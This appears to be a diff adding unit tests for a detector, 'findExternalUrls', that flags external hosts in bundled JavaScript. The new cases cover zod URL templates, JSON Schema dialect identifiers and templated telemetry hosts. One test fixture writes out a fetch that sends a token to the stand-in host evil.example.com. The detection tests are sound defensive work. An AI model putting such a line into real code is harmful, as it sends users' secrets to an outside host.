@@ -94,6 +94,55 @@ describe('findExternalUrls', () => {
     ]);
   });
 
+  it('ignores a URL with no literal host at all, which is how zod hands an address to the URL parser', () => {
+    const js =
+      'new URL(`http://[${address}]`); new URL(`https://${host}:${port}/x`)';
+
+    expect(findExternalUrls(js)).toStrictEqual([]);
+  });
+
+  it('still reports a literal external host even when the path is built at runtime', () => {
+    const js = 'fetch(`https://evil.example.com/${token}`)';
+
+    expect(findExternalUrls(js)).toStrictEqual([
+      'https://evil.example.com/${token}',
+    ]);
+  });
+
+  it('reports an external host that merely interpolates part of its authority', () => {
+    const js = [
+      'fetch(`https://${region}.amazonaws.com/bucket`)',
+      'fetch(`https://${key}@o12345.ingest.sentry.io/1`)',
+      'fetch(`https://api.openai.com${path}`)',
+      'fetch(`https://telemetry.example.net:${port}/hit`)',
+    ].join('\n');
+
+    expect(findExternalUrls(js)).toStrictEqual([
+      'https://${region}.amazonaws.com/bucket',
+      'https://${key}@o12345.ingest.sentry.io/1',
+      'https://api.openai.com${path}',
+      'https://telemetry.example.net:${port}/hit',
+    ]);
+  });
+
+  it('allows the JSON Schema dialect identifiers zod ships, which name a dialect rather than an address', () => {
+    const js = [
+      'const s = "https://json-schema.org/draft/2020-12/schema";',
+      'const t = "http://json-schema.org/draft-07/schema#";',
+      'const u = "http://json-schema.org/draft-04/schema#";',
+    ].join('\n');
+
+    expect(findExternalUrls(js)).toStrictEqual([]);
+  });
+
+  it('still reports a fetchable asset on the JSON Schema host', () => {
+    const js = 'const f = "https://json-schema.org/assets/tracker.js";';
+
+    expect(findExternalUrls(js)).toStrictEqual([
+      'https://json-schema.org/assets/tracker.js',
+    ]);
+  });
+
   it('finds nothing in output that loads everything from itself', () => {
     const js =
       'const logo = "/assets/logo-a1b2c3.svg"; fetch("/api/capabilities");';
